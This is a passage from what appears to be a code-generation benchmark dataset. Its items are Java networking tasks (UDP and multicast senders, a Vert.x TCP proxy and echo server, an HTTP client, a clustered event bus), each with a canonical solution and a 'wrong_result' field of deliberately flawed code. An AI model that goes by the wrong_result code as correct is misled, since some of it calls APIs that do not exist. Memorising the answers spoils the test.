    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.InetAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\nimport static java.nio.charset.StandardCharsets.UTF_8;\n\npublic class GraphiteUDP implements GraphiteSender {\n\n    private final String hostname;\n    private final int port;\n    private InetSocketAddress address;\n\n    private DatagramChannel datagramChannel = null;\n    private int failures;\n\n    public GraphiteUDP(String hostname, int port) {\n        this.hostname = hostname;\n        this.port = port;\n        this.address = null;\n    }\n\n    public GraphiteUDP(InetSocketAddress address) {\n        this.hostname = null;\n        this.port = -1;\n        this.address = address;\n    }\n\n    @Override\n    public void connect() throws IllegalStateException, IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n\n        if (hostname != null) {\n            address = new InetSocketAddress(InetAddress.getByName(hostname), port);\n        }\n\n        datagramChannel = DatagramChannel.open();\n    }\n\n    @Override\n    public boolean isConnected() {\n        return datagramChannel != null && !datagramChannel.socket().isClosed();\n    }\n\n    @Override\n    public void send(String name, String value, long timestamp) throws IOException {\n        try {\n            String str = sanitize(name) + ' ' + sanitize(value) + ' ' + Long.toString(timestamp) + '\\n';\n            ByteBuffer byteBuffer = ByteBuffer.wrap(str.getBytes(UTF_8));\n            datagramChannel.send(byteBuffer, address);\n            this.failures = 0;\n        } catch (IOException e) {\n            failures++;\n            throw e;\n        }\n    }\n\n    @Override\n    public int getFailures() {\n        return failures;\n    }\n\n    @Override\n    public void flush() throws IOException {\n        // Nothing to do\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (datagramChannel != null) {\n            try {\n                datagramChannel.close();\n            } finally {\n                datagramChannel = null;\n            }\n        }\n    }\n\n    protected String sanitize(String s) {\n        return GraphiteSanitize.sanitize(s);\n    }\n\n    DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    InetSocketAddress getAddress() {\n        return address;\n    }\n\n    void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "public class GraphiteUDP {\n    private String hostname;\n    private int port;\n    private InetSocketAddress address;\n    private DatagramChannel datagramChannel;\n    private int failures;\n\n    public GraphiteUDP(String hostname, int port) {\n        this.hostname = hostname;\n        this.port = port;\n        this.address = new InetSocketAddress(hostname, port);\n    }\n\n    public void connect() {\n        try {\n            datagramChannel = DatagramChannel.open();\n            datagramChannel.configureBlocking(false);\n            datagramChannel.connect(address);\n        } catch (IOException e) {\n            failures++;\n        }\n    }\n\n    public boolean isConnected() {\n        return datagramChannel != null && datagramChannel.isConnected();\n    }\n\n    public void send(String name, String value, long timestamp) {\n        String metric = sanitize(name) + \" \" + sanitize(value) + \" \" + timestamp + \"\\n\";\n        try {\n            ByteBuffer buffer = ByteBuffer.wrap(metric.getBytes(StandardCharsets.UTF_8));\n            datagramChannel.send(buffer, address);\n        } catch (IOException e) {\n            failures++;\n        }\n    }\n\n    public int getFailures() {\n        return failures;\n    }\n\n    public void flush() {\n        // No action needed for UDP\n    }\n\n    public void close() {\n        if (datagramChannel != null) {\n            try {\n                datagramChannel.close();\n            } catch (IOException e) {\n                // Handle error\n            }\n        }\n    }\n\n    private String sanitize(String s) {\n        return GraphiteSanitize.sanitize(s);\n    }\n\n    public DatagramChannel getDatagramChannel() {\n        return datagramChannel;\n    }\n\n    public void setDatagramChannel(DatagramChannel datagramChannel) {\n        this.datagramChannel = datagramChannel;\n    }\n\n    public InetSocketAddress getAddress() {\n        return address;\n    }\n\n    public void setAddress(InetSocketAddress address) {\n        this.address = address;\n    }\n}"
  },
  {
    "Task_id": 446,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking UDP sender using Java NIO's DatagramChannel for asynchronous communication.\n\nClass Description: The Sender class provides functionality to establish a non-blocking UDP connection, send data packets to a specified host and port, and manage the connection lifecycle. It uses Java NIO's DatagramChannel for efficient network communication.\n\nAttributes:\n- host: [String] - The target hostname or IP address for UDP communication\n- port: [int] - The target port number for UDP communication\n- address: [InetSocketAddress] - The socket address combining host and port for the target\n- channel: [DatagramChannel] - The NIO channel used for UDP communication\n\nMethods:\n- connect(): [void] -> [void] - Opens a DatagramChannel and prepares it for communication. Throws IOException if connection fails and IllegalStateException if already connected.\n- isConnected(): [void] -> [boolean] - Checks if the channel is currently connected and not closed.\n- send(ByteBuffer buffer): [ByteBuffer] -> [void] - Sends the contents of the provided ByteBuffer to the target address. Throws IOException if sending fails.\n- disconnect(): [void] -> [void] - Closes the DatagramChannel and releases resources. Safe to call even if not connected.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class Sender {\n\n    private final String host;\n    private final int port;\n    private InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        if (host != null) {\n            address = new InetSocketAddress(host, port);\n        }\n        channel = DatagramChannel.open();\n    }\n\n    public boolean isConnected() {\n        return channel != null && !channel.socket().isClosed();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        channel.send(buffer, address);\n    }\n\n    public void disconnect() throws IOException {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } finally {\n            channel = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "public class Sender {\n    private String host;\n    private int port;\n    private InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.address = new InetSocketAddress(host, port);\n    }\n\n    public void connect() throws IOException {\n        if (channel != null && channel.isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        if (channel == null) {\n            channel = DatagramChannel.open();\n            channel.configureBlocking(false);\n        }\n        channel.connect(address);\n    }\n\n    public boolean isConnected() {\n        return channel != null && channel.isConnected() && channel.isOpen();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        if (!isConnected()) {\n            throw new IOException(\"Not connected\");\n        }\n        if (buffer == null) {\n            throw new IllegalArgumentException(\"Buffer cannot be null\");\n        }\n        int bytesSent = channel.send(buffer, address);\n        if (bytesSent != buffer.remaining()) {\n            throw new IOException(\"Failed to send all data\");\n        }\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                // Ignore or log, but per problem statement, safe to call\n            }\n            channel = null;\n        }\n    }\n}"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Create a Java class that implements a multicast sender using UDP with Java NIO's DatagramChannel for non-blocking communication. The class should support both IPv4 and IPv6 protocols and allow sending messages to a multicast group.\n\nClass Description: The MulticastSender class is responsible for sending messages to a multicast group using UDP. It utilizes Java NIO's DatagramChannel for efficient non-blocking communication and supports configuration of TTL (Time To Live) for multicast packets. The class handles both IPv4 and IPv6 protocols automatically based on the system's IP stack type.\n\nAttributes:\n- sock: [DatagramSocket] - The underlying DatagramSocket used for communication\n- mcast_addr: [InetAddress] - The multicast address to send messages to\n- bind_addr: [InetAddress] - The local address to bind to\n- mcast_port: [int] - The multicast port number\n- local_port: [int] - The local port number to bind to\n- ttl: [int] - Time To Live for multicast packets\n- prot_family: [ProtocolFamily] - The protocol family (INET or INET6) determined by the system's IP stack\n\nMethods:\n- MulticastSender: [Constructor](InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) -> [void] - Initializes the multicast sender with binding address, ports, multicast address, and TTL\n- start: [start]() -> [void] - Starts the sender, binds to the specified address and port, and begins reading input from stdin to send as multicast messages\n- bindToInterfaces: [bindToInterfaces](List<NetworkInterface> interfaces, MulticastSocket s) -> [void] - Helper method to bind multicast socket to multiple network interfaces (currently unused in main flow)",
    "Canonical_solution": "import org.jgroups.util.StackType;\nimport org.jgroups.util.Util;\n\nimport java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.channels.DatagramChannel;\nimport java.util.Collections;\nimport java.util.List;\n\npublic class MulticastSender {\n    protected DatagramSocket sock;\n    protected InetAddress mcast_addr;\n    protected InetAddress bind_addr;\n    protected int mcast_port;\n    protected final int local_port;\n    protected final int ttl;\n    protected static final ProtocolFamily prot_family;\n\n    static {\n        StackType ip_version = Util.getIpStackType();\n        prot_family = ip_version == StackType.IPv6 ? StandardProtocolFamily.INET6 : StandardProtocolFamily.INET;\n    }\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n    }\n\n    public void start() throws Exception {\n        DatagramChannel channel = null;\n        try {\n            channel = DatagramChannel.open(prot_family)\n                    .setOption(StandardSocketOptions.IP_MULTICAST_TTL, ttl)\n                    .bind(new InetSocketAddress(bind_addr, local_port));\n            sock = channel.socket();\n\n            DataInputStream in = new DataInputStream(System.in);\n            while(true) {\n                System.out.print(\"> \");\n                try {\n                    String line = Util.readLine(in);\n                    byte[] buf = line.getBytes();\n                    DatagramPacket packet = new DatagramPacket(buf, buf.length, mcast_addr, mcast_port);\n                    sock.send(packet);\n                }\n                catch(Throwable t) {\n                    t.printStackTrace();\n                }\n            }\n        }\n        finally {\n            if(channel != null)\n                channel.close();\n        }\n    }\n\n    protected void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) {\n        SocketAddress tmp_mcast_addr = new InetSocketAddress(mcast_addr, mcast_port);\n        for(NetworkInterface intf: interfaces) {\n            try {\n                s.joinGroup(tmp_mcast_addr, intf);\n            }\n            catch(IOException e) {\n                System.err.printf(\"failed joining interface %s: %s\\n\", intf, e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "wrong_result": "public class MulticastSender {\n    private DatagramChannel channel;\n    private ProtocolFamily prot_family;\n    private InetAddress mcast_addr;\n    private InetAddress bind_addr;\n    private int mcast_port;\n    private int local_port;\n    private int ttl;\n\n    public MulticastSender(InetAddress bind_addr, int local_port, InetAddress mcast_addr, int mcast_port, int ttl) {\n        this.bind_addr = bind_addr;\n        this.local_port = local_port;\n        this.mcast_addr = mcast_addr;\n        this.mcast_port = mcast_port;\n        this.ttl = ttl;\n\n        prot_family = (bind_addr instanceof Inet6Address) ? ProtocolFamily.INET6 : ProtocolFamily.INET;\n\n        try {\n            channel = DatagramChannel.open(prot_family);\n            channel.bind(new InetSocketAddress(bind_addr, local_port));\n            channel.configureBlocking(false);\n\n            if (prot_family == ProtocolFamily.INET) {\n                channel.setOption(StandardSocketOptions.IP_TTL, ttl);\n            } else {\n                channel.setOption(StandardSocketOptions.IPV6_MULTICAST_HOPS, ttl);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void start() {\n        new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    byte[] data = line.getBytes(StandardCharsets.UTF_8);\n                    ByteBuffer buffer = ByteBuffer.wrap(data);\n                    channel.send(buffer, new InetSocketAddress(mcast_addr, mcast_port));\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public void bindToInterfaces(List<NetworkInterface> interfaces, MulticastSocket s) {\n    }\n}"
  },
  {
    "Task_id": 449,
    "Instruction": "Task Description: Implement a TCP proxy server using Vert.x that forwards incoming connections to a remote server after writing a custom header.\n\nClass Description: The HAProxy class acts as a TCP proxy server that listens for incoming connections, establishes connections to a remote server, writes a specified header to the remote connection, and then pipes data bidirectionally between the client and server.\n\nAttributes:\n- log: Logger - Logger instance for logging debug and error messages\n- HOST: String - The host address where the proxy server will listen (default: \"localhost\")\n- PORT: int - The port number where the proxy server will listen (default: 11080)\n- remoteAddress: SocketAddress - The address of the remote server to forward connections to\n- header: Buffer - The header data to write to the remote connection\n- server: NetServer - The Vert.x TCP server instance\n- client: NetClient - The Vert.x TCP client instance for connecting to remote server\n- connectionRemoteAddress: SocketAddress - Stores the remote address of the established connection\n- connectionLocalAddress: SocketAddress - Stores the local address of the established connection\n\nMethods:\n- HAProxy(SocketAddress remoteAddress, Buffer header) -> HAProxy - Constructor that initializes the proxy with remote server address and header data\n- start(Vertx vertx) -> HAProxy - Starts the proxy server, configures connection handling, and returns the instance (throws Exception if startup fails)\n- stop() -> void - Stops the proxy server and cleans up resources\n- getConnectionRemoteAddress() -> SocketAddress - Returns the remote address of the established connection\n- getConnectionLocalAddress() -> SocketAddress - Returns the local address of the established connection",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.internal.logging.Logger;\nimport io.vertx.core.internal.logging.LoggerFactory;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetClient;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.net.SocketAddress;\n\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\n\npublic class HAProxy {\n\n    private static final Logger log = LoggerFactory.getLogger(HAProxy.class);\n    private static final String HOST = \"localhost\";\n    private static final int PORT = 11080;\n    private final SocketAddress remoteAddress;\n    private final Buffer header;\n    private NetServer server;\n    private NetClient client;\n    private SocketAddress connectionRemoteAddress;\n    private SocketAddress connectionLocalAddress;\n\n    public HAProxy(SocketAddress remoteAddress, Buffer header) {\n        this.remoteAddress = remoteAddress;\n        this.header = header;\n    }\n\n    public HAProxy start(Vertx vertx) throws Exception {\n        NetServerOptions options = new NetServerOptions();\n        options.setHost(HOST).setPort(PORT);\n        server = vertx.createNetServer(options);\n        client = vertx.createNetClient();\n\n        server.connectHandler(socket -> {\n            socket.pause();\n            client.connect(remoteAddress).onComplete(result -> {\n                if (result.succeeded()) {\n                    log.debug(\"connected, writing header\");\n                    NetSocket clientSocket = result.result();\n                    connectionRemoteAddress = clientSocket.remoteAddress();\n                    connectionLocalAddress = clientSocket.localAddress();\n                    clientSocket.write(header).onSuccess(u -> {\n                        log.debug(\"starting pump\");\n                        socket.closeHandler(v -> clientSocket.close());\n                        clientSocket.closeHandler(v -> socket.close());\n                        socket.pipeTo(clientSocket);\n                        clientSocket.pipeTo(socket);\n                        socket.resume();\n                    }).onFailure(u -> {\n                        log.error(\"exception writing header\", result.cause());\n                        socket.close();\n                    });\n                } else {\n                    log.error(\"exception\", result.cause());\n                    socket.close();\n                }\n            });\n        });\n\n        CompletableFuture<Void> fut = new CompletableFuture<>();\n        server.listen().onComplete(ar -> {\n            if (ar.succeeded()) {\n                fut.complete(null);\n            } else {\n                fut.completeExceptionally(ar.cause());\n            }\n        });\n        fut.get(10, TimeUnit.SECONDS);\n        log.debug(\"HAProxy server started\");\n        return this;\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.close();\n            server = null;\n        }\n    }\n\n    public SocketAddress getConnectionRemoteAddress() {\n        return connectionRemoteAddress;\n    }\n\n    public SocketAddress getConnectionLocalAddress() {\n        return connectionLocalAddress;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "public class HAProxy {\n    private final Logger log;\n    private final String HOST;\n    private final int PORT;\n    private final SocketAddress remoteAddress;\n    private final Buffer header;\n    private NetServer server;\n    private NetClient client;\n    private SocketAddress connectionRemoteAddress;\n    private SocketAddress connectionLocalAddress;\n\n    public HAProxy(SocketAddress remoteAddress, Buffer header) {\n        this.log = LoggerFactory.getLogger(HAProxy.class);\n        this.HOST = \"localhost\";\n        this.PORT = 11080;\n        this.remoteAddress = remoteAddress;\n        this.header = header;\n        this.server = null;\n        this.client = null;\n        this.connectionRemoteAddress = null;\n        this.connectionLocalAddress = null;\n    }\n\n    public HAProxy start(Vertx vertx) throws Exception {\n        this.client = vertx.createNetClient();\n        this.server = vertx.createNetServer();\n        this.server.connectHandler(clientConnection -> {\n            this.client.connect(this.remoteAddress, remoteConnection -> {\n                if (remoteConnection.succeeded()) {\n                    SocketAddress remoteConnAddr = remoteConnection.result().getRemoteAddress();\n                    SocketAddress localConnAddr = remoteConnection.result().getLocalAddress();\n                    this.connectionRemoteAddress = remoteConnAddr;\n                    this.connectionLocalAddress = localConnAddr;\n                    remoteConnection.result().write(this.header);\n                    clientConnection.pipe(remoteConnection.result()).handler(v -> {\n                        if (v instanceof Throwable) {\n                            log.error(\"Error piping data\", v);\n                            clientConnection.close();\n                        }\n                    });\n                    remoteConnection.result().pipe(clientConnection).handler(v -> {\n                        if (v instanceof Throwable) {\n                            log.error(\"Error piping data\", v);\n                            clientConnection.close();\n                        }\n                    });\n                } else {\n                    log.error(\"Failed to connect to remote server\", remoteConnection.cause());\n                    clientConnection.close();\n                }\n            });\n        }).listen(this.PORT, this.HOST);\n        return this;\n    }\n\n    public void stop() {\n        if (server != null) {\n            server.close();\n        }\n        if (client != null) {\n            client.close();\n        }\n    }\n\n    public SocketAddress getConnectionRemoteAddress() {\n        return this.connectionRemoteAddress;\n    }\n\n    public SocketAddress getConnectionLocalAddress() {\n        return this.connectionLocalAddress;\n    }\n}"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for interacting with a radio scanner API, supporting both synchronous and asynchronous requests.\n\nClass Description: The RdioScannerHttpClient class provides methods to test API connections and send audio recordings to a radio scanner service using HTTP multipart form data requests. It uses Java's HttpClient for HTTP/2 communication with configurable timeouts and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection]([RdioScannerConfiguration configuration]) -> [String] - Synchronously tests the API connection by sending a test request with the API key and system ID, returns the response body with status code or error message\n- sendAudioRecordingAsync: [sendAudioRecordingAsync]([RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder]) -> [void] - Asynchronously sends an audio recording to the API using multipart form data, handles response completion with success/error callbacks",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class RdioScannerHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(RdioScannerConfiguration configuration) {\n        RdioScannerBuilder bodyBuilder = new RdioScannerBuilder();\n        bodyBuilder.addPart(FormField.KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder) {\n        HttpRequest fileRequest = HttpRequest.newBuilder()\n            .uri(URI.create(config.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        mHttpClient.sendAsync(fileRequest, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((fileResponse, throwable1) -> {\n                if(throwable1 != null || fileResponse.statusCode() != 200) {\n                    if(throwable1 instanceof IOException || throwable1 instanceof CompletionException) {\n                        // Handle error cases\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "wrong_result": "public class RdioScannerHttpClient {\n    private final HttpClient mHttpClient;\n\n    public RdioScannerHttpClient() {\n        this.mHttpClient = HttpClient.newBuilder()\n                .version(HttpClient.Version.HTTP_2)\n                .connectTimeout(Duration.ofSeconds(20))\n                .followRedirects(HttpClient.Redirect.NORMAL)\n                .build();\n    }\n\n    public String testConnection(RdioScannerConfiguration configuration) {\n        String testUrl = configuration.getTestUrl();\n        String apiKey = configuration.getApiKey();\n        String systemId = configuration.getSystemId();\n\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(testUrl))\n                .POST(HttpRequest.BodyPublishers.ofString(\"apiKey=\" + apiKey + \"&systemId=\" + systemId))\n                .header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n                .build();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n            return response.body();\n        } catch (Exception e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder,\n                                       Consumer<HttpResponse<String>> onSuccess, Consumer<Throwable> onError) {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(config.getUploadUrl()))\n                .POST(HttpRequest.BodyPublishers.ofMultipartFormData(bodyBuilder.buildMultipartBody()))\n                .header(\"Content-Type\", \"multipart/form-data\")\n                .build();\n\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                .thenAccept(onSuccess)\n                .exceptionally(ex -> {\n                    onError.accept(ex);\n                    return null;\n                });\n    }\n}"
  },
  {
    "Task_id": 450,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Vert.x framework to handle multiple client connections, process incoming data, and manage server lifecycle operations.\n\nClass Description: The VertxTcpServer class provides functionality to start, stop, and manage a TCP server using Vert.x. It handles client connections, processes incoming data with echo functionality, and manages connection events.\n\nAttributes:\n- server: [NetServer] - The Vert.x NetServer instance that manages TCP connections\n\nMethods:\n- startServer(Vertx vertx, int port, String host) -> void - Initializes and starts the TCP server on specified host and port\n- handleConnection(NetSocket socket) -> void - Handles incoming client connections, processes data, and manages connection events\n- stopServer() -> void - Gracefully shuts down the TCP server\n\nMethod Details:\n1. startServer(Vertx vertx, int port, String host) -> void\n   - Input Parameters:\n     - vertx: Vertx - The Vert.x instance\n     - port: int - The port number to listen on\n     - host: String - The host address to bind to\n   - Description: Configures server options, creates NetServer instance, sets up connection handler, and starts listening for connections\n\n2. handleConnection(NetSocket socket) -> void\n   - Input Parameters:\n     - socket: NetSocket - The client connection socket\n   - Description: Sets up handlers for incoming data (echoes back received data), connection closure, and exceptions\n\n3. stopServer() -> void\n   - Description: Closes the server and all active connections, with completion handler for success/failure notification",
    "Canonical_solution": "import io.vertx.core.Vertx;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.buffer.Buffer;\n\npublic class VertxTcpServer {\n\n    private NetServer server;\n\n    public void startServer(Vertx vertx, int port, String host) {\n        NetServerOptions options = new NetServerOptions().setPort(port).setHost(host);\n        server = vertx.createNetServer(options);\n\n        server.connectHandler(socket -> {\n            handleConnection(socket);\n        });\n\n        server.listen().onComplete(res -> {\n            if (res.succeeded()) {\n                System.out.println(\"Server is now listening on port: \" + port);\n            } else {\n                System.out.println(\"Failed to bind: \" + res.cause().getMessage());\n            }\n        });\n    }\n\n    private void handleConnection(NetSocket socket) {\n        socket.handler(buffer -> {\n            System.out.println(\"Received data: \" + buffer.length() + \" bytes\");\n            socket.write(Buffer.buffer(\"Echo: \").appendBuffer(buffer));\n        });\n\n        socket.closeHandler(v -> {\n            System.out.println(\"Connection closed\");\n        });\n\n        socket.exceptionHandler(err -> {\n            System.err.println(\"Connection error: \" + err.getMessage());\n        });\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close().onComplete(res -> {\n                if (res.succeeded()) {\n                    System.out.println(\"Server closed successfully\");\n                } else {\n                    System.err.println(\"Failed to close server: \" + res.cause().getMessage());\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "public class VertxTcpServer {\n    private NetServer server;\n\n    public void startServer(Vertx vertx, int port, String host) {\n        NetServerOptions options = new NetServerOptions().setHost(host).setPort(port);\n        this.server = vertx.createNetServer(options);\n        this.server.connectHandler(this::handleConnection);\n        this.server.listen();\n    }\n\n    private void handleConnection(NetSocket socket) {\n        socket.handler(buffer -> {\n            socket.write(buffer);\n        });\n        socket.endHandler(v -> {\n            // Handle connection closure\n        });\n        socket.exceptionHandler(throwable -> {\n            // Handle exceptions\n        });\n    }\n\n    public void stopServer() {\n        if (server != null) {\n            server.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 451,
    "Instruction": "Task Description: Create a Java class that implements a clustered event bus using Vert.x TCP server for inter-process communication, handling message delivery between distributed components.\n\nClass Description: The ClusteredEventBus class extends EventBusImpl to provide clustered event bus functionality using Vert.x's TCP server capabilities. It manages TCP connections, processes incoming messages, and delivers them locally within the cluster.\n\nAttributes:\n- options: [EventBusOptions] - Configuration options for the event bus including port, host, and other TCP settings\n- server: [NetServer] - The Vert.x TCP server instance that handles incoming connections\n\nMethods:\n- ClusteredEventBus([VertxInternal vertx, VertxOptions options]) -> [void] - Constructor that initializes the clustered event bus with Vertx instance and options\n- getServerOptions() -> [NetServerOptions] - Creates and returns NetServerOptions based on the event bus configuration\n- start([Promise<Void> promise]) -> [void] - Starts the TCP server and sets up connection handlers\n- getServerHandler() -> [Handler<NetSocket>] - Creates and returns the handler for processing incoming TCP connections and messages\n- getClusterPort() -> [int] - Returns the configured cluster port from options\n- getClusterHost() -> [String] - Returns the configured cluster host address from options or default address if not specified",
    "Canonical_solution": "import io.vertx.core.*;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.net.NetServer;\nimport io.vertx.core.net.NetServerOptions;\nimport io.vertx.core.net.NetSocket;\nimport io.vertx.core.parsetools.RecordParser;\n\npublic class ClusteredEventBus extends EventBusImpl {\n\n  private final EventBusOptions options;\n  private NetServer server;\n\n  public ClusteredEventBus(VertxInternal vertx, VertxOptions options) {\n    super(vertx);\n    this.options = options.getEventBusOptions();\n  }\n\n  private NetServerOptions getServerOptions() {\n    return new NetServerOptions(this.options.toJson());\n  }\n\n  @Override\n  public void start(Promise<Void> promise) {\n    NetServerOptions serverOptions = getServerOptions();\n    server = vertx.createNetServer(serverOptions);\n    server.connectHandler(getServerHandler());\n    int port = getClusterPort();\n    String host = getClusterHost();\n    server.listen(port, host).onComplete(promise);\n  }\n\n  private Handler<NetSocket> getServerHandler() {\n    return socket -> {\n      RecordParser parser = RecordParser.newFixed(4);\n      Handler<Buffer> handler = new Handler<Buffer>() {\n        int size = -1;\n\n        public void handle(Buffer buff) {\n          if (size == -1) {\n            size = buff.getInt(0);\n            parser.fixedSizeMode(size);\n          } else {\n            ClusteredMessage received = new ClusteredMessage(ClusteredEventBus.this);\n            received.readFromWire(buff, codecManager);\n            parser.fixedSizeMode(4);\n            size = -1;\n            if (received.codec() == CodecManager.PING_MESSAGE_CODEC) {\n              socket.write(PONG);\n            } else {\n              deliverMessageLocally(received);\n            }\n          }\n        }\n      };\n      parser.setOutput(handler);\n      socket.handler(parser);\n    };\n  }\n\n  private int getClusterPort() {\n    return options.getPort();\n  }\n\n  private String getClusterHost() {\n    String host;\n    if ((host = options.getHost()) != null) {\n      return host;\n    }\n    return AddressHelper.defaultAddress();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 13,
    "wrong_result": "public class ClusteredEventBus extends EventBusImpl {\n    private final EventBusOptions options;\n    private final NetServer server;\n\n    public ClusteredEventBus(VertxInternal vertx, VertxOptions options) {\n        super(vertx);\n        this.options = new EventBusOptions();\n        this.options.setPort(options.getPort());\n        this.options.setHost(options.getHost());\n        this.server = null;\n    }\n\n    public NetServerOptions getServerOptions() {\n        NetServerOptions serverOptions = new NetServerOptions();\n        serverOptions.setPort(getClusterPort());\n        serverOptions.setHost(getClusterHost());\n        return serverOptions;\n    }\n\n    public void start(Promise<Void> promise) {\n        this.server = vertx.createNetServer(getServerOptions());\n        this.server.connectHandler(getServerHandler()).listen(promise);\n    }\n\n    public Handler<NetSocket> getServerHandler() {\n        return socket -> {\n            socket.handler(buffer -> {\n                String address = \"clustered-event-bus\";\n                publish(address, buffer);\n            });\n        };\n    }\n\n    public int getClusterPort() {\n        return options.getPort();\n    }\n\n    public String getClusterHost() {\n        return options.getHost() != null ? options.getHost() : \"0.0.0.0\";\n    }\n}"
  },
  {
    "Task_id": 453,
    "Instruction": "Task Description: Implement a function that demonstrates UDP communication using Vert.x in Java, allowing sending of data packets to a specified target address and port, with success/failure notification.\n\nFunction Description: The function creates a UDP socket using Vert.x, configures it with default options, and demonstrates two ways to send data: using a Buffer object and directly using a String. It includes asynchronous result handling to report whether each send operation succeeded.\n\nInput:\n- vertx: Vertx - The Vert.x instance used to create the UDP socket\n\nOutput: None (The function's output is the side effect of sending UDP packets and printing success/failure messages to the console)",
